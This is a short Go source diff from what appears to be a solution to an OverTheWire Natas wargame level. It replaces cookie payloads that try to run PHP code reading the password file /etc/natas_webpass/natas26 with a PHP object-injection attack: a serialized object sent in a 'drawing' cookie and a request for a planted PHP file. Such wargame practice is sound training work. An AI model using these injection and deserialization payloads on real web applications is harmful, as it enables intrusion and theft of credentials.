@@ -5,12 +5,16 @@ import (
 	"encoding/base64"
 	"fmt"
 	"net/http"
+	"os/exec"
 	"strings"
 )
 
 func main() {
 
+	//Opject Injection, creo se serializzo un oggetto della classe Logger
+	//presente nel codice sorgente
 	result("?x1=1&y1=1&x2=300&y2=300")
+	result("img/natas26_Clouz3.php")
 }
 
 func result(xx string) bool {
@@ -27,11 +31,13 @@ func result(xx string) bool {
 	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))
 
 	req.Header.Set("User-Agent", "Clouz>")
-	//cookie := http.Cookie{Name: "PHPSESSID", Value: "(new Logger('Clouz'))->Log('ciao').'Clouz'"}
-	//cookie := http.Cookie{Name: "PHPSESSID", Value: "setcookie('pass',file_get_contents('/etc/natas_webpass/natas26'))"}
-	cookie := http.Cookie{Name: "PHPSESSID", Value: "file_get_contents(\"/etc/natas_webpass/natas26\")"}
-	//cookie := http.Cookie{Name: "PHPSESSID", Value: "print_r(\"ciao\")"}
+	cookie := http.Cookie{Name: "PHPSESSID", Value: "Clouz"}
+	req.AddCookie(&cookie)
 
+	drawing, _ := exec.Command("php", "-f", "natas26SerializeClass.php").Output()
+	fmt.Println("DRAWING: ", drawing)
+
+	cookie = http.Cookie{Name: "drawing", Value: string(drawing)}
 	req.AddCookie(&cookie)
 
 	res, _ := client.Do(req)
